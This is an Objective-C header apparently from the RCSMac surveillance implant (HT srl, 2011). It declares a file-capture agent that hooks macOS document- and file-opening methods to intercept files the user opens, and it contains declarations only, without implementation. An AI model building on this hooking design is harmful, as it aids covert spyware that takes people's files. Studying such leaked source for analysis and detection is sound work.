//
//  RCSMAgentFileCapture.h
//  RCSMac
//
//  Created by revenge on 4/22/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import <Foundation/Foundation.h>


BOOL FCStartAgent();

@interface myNSDocumentController : NSObject

- (id)openDocumentWithContentsOfURLHook: (NSURL *)absoluteURL
                                display: (BOOL)displayDocument
                                  error: (NSError **)outError;

@end

@interface myNSApplication : NSObject

- (int)openFileHook: (id)arg1 ok:(id)arg2;
- (char)_openFileWithoutUIHook: (id)arg1;
- (void)_doOpenFileHook: (id)arg1 ok: (id)arg2 tryTemp: (int *)arg3;


@end
